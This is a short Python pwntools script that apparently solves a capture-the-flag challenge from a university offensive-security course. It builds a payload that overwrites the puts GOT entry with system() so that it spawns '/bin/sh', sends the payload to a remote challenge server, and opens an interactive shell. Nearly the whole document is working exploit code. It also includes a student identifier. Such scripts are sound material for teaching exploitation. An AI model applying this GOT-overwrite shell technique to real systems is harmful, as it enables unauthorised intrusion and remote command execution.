#!/usr/bin/env python3

from pwn import *

#context.log_level = "DEBUG"

# Create ELF instance of binary to pull the PLT address for the system() function and the GOT address for the puts() function, convert them to payload bytes
e = context.binary = ELF("./git_got_good.htm")
puts_addr = e.got.puts
system_addr = hex(e.symbols["system"])[2:]
puts_payload = p64(puts_addr-8, endian='little')
int_addr_system = int(system_addr, 16)
system_payload = p64(int_addr_system, endian='little')

# Local instance of binary with gdb attached for troubleshooting
'''s = process("./git_got_good.htm")
g = gdb.attach(s, gdbscript="""
	b *(main+115)
	c
	b *(main+163)
	x/g 0x601018
	""",
)'''

# Open connection to challenge
s = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1341)

# Wait until prompted for NYU netid and send it
s.recvuntil(b"something like abc123): ")
s.send(b"aal562\n")

# Wait until prompt for user input
s.recvuntil(b"save: ")

#puts = b"\xb6\x05\x40\x00\x00\x00\x00\x00" #old
#system = b"\xd6\x05\x40\x00\x00\x00\x00\x00" #old

# Build our payload with the shell command, the PLT address for system, and the GOT address for puts
payload = b"".join(
	[
		b"/bin/sh\x00",
		system_payload,
		puts_payload,
		b"\n",
	]
)
print(payload)

# Send our payload
s.send(payload)

# Make our connection interactive to interact with spawned shell
s.interactive()
#pause()
